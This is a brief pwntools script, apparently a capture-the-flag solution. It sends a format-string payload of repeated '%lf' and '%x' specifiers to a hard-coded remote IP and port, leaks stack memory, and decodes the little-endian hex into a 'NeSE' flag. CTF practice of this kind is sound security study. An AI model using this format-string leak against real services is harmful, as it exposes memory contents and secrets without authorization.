from pwn import *


r = remote("124.16.75.117", 51002)

print(r.recvline().decode())

payload = b"%lf" * 13 + b" " + b"%x" * 12

r.sendline(payload)
respon = r.recvall().decode()
print(respon)

start_index = respon.find("4553654e")  # NeSE, little-endian
print(start_index)

rst = respon.split(" ")[2]
rstlist = []
for i in range(0, len(rst), 8):
    try:
        rstlist.append(rst[i : i + 8])
    except:
        rstlist.append(rst[i:])
# print(rstlist)

flag = ""
for i in rstlist:
    try:
        each = bytes.fromhex(i).decode()[::-1]
        flag += each
    except:
        print(f"Error decoding: {i}")
        continue
# 7d is }, need to add it and another char by yourself (i'm lazy to code it)
print(rst)
print(flag)
